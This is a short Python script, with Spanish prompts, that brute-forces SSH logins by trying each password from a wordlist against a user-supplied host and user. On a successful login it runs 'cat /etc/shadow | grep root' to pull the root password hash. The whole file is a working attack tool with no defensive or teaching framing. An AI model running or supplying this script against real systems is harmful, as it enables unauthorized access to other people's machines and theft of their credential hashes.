#!/usr/bin/python

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def main():
	host = input('Ingrese el host del ssh a hacer bruteforce: ')
	usuario = input('Ingrese el usuario del ssh a hacer bruteforce: ')
	file = open('passwordsbruteforce.txt', 'r')
	for contrasena in file.readlines():
		contrasena = contrasena.strip('\n')
		try:
			conexionssh(usuario, contrasena, host)
			print(colored('[+] Contrasena encontrada: ' + contrasena, 'green'))
			enviarcomando(conexionssh(usuario, contrasena, host), 'cat /etc/shadow | grep root')
		except:
			print(colored('[-] Contrasena incorrecta: ' + contrasena, 'red'))

def conexionssh(usuario, contrasena, host):
        comandossh = 'ssh ' + usuario + '@' + host
        consola = pexpect.spawn(comandossh)
	resultado = consola.expect([pexpect.TIMEOUT, '[P|p]assword: ', 'Are you sure you want to continue?'])
	if resultado == 0:
		print('[-] La consola no devolvio lo esperado')
		return
	if resultado == 2:
		consola.sendline('yes')
	consola.sendline(contrasena)
	consola.expect(PROMPT, timeout = 0.3)
	return consola

def enviarcomando(consola, comando):
	consola.sendline(comando)
	consola.expect(PROMPT)
	print(consola.before)

if __name__ == "__main__":
	main()
